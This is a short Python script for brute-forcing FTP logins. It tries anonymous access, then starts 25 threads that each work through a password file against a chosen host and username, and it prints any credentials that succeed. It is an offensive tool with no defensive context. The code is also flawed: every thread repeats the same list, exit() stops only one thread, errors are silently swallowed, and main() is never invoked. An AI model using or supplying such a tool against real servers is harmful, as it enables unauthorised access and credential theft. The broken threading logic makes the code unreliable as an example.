import ftplib
import threading
import sys
from termcolor import colored


def check_login(host, user, pwd):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, pwd)
        ftp.quit()
        print(colored("[+] Successfully logged in!", "green"))
        print(colored(f"Username:{user}\nPassword:{pwd}", "green"))
        exit(0)
    except:
        pass


def default_login(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login()
        print(colored("Successfully logged in as anonymous", "green"))
        exit(0)
    except:
        pass


def brute_login(host, username, passfile):
    try:
        print(colored(f"[+] Attacking {host} with username {username}", "blue", attrs=["reverse", "blink"]))
        passfile = open(passfile, "r")
        for i, pwd in enumerate(passfile.readlines()):
            pwd = pwd.strip()
            sys.stdout.write("\r" + str(i))
            sys.stdout.flush()
            check_login(host, username, pwd)
    except Exception as E:
        print(E)
        print(colored("[!] None of the passwords matched/Other issue encountered!", "red", attrs=["underline"]))


def main():
    host = input("Enter host address: ")
    file = input("Enter filename: ")
    user = input("Enter username: ")
    default_login(host)
    for i in range(25):
        t = threading.Thread(target=brute_login, args=(host, user, file))
        t.start()
    print("[!] Process complete!")
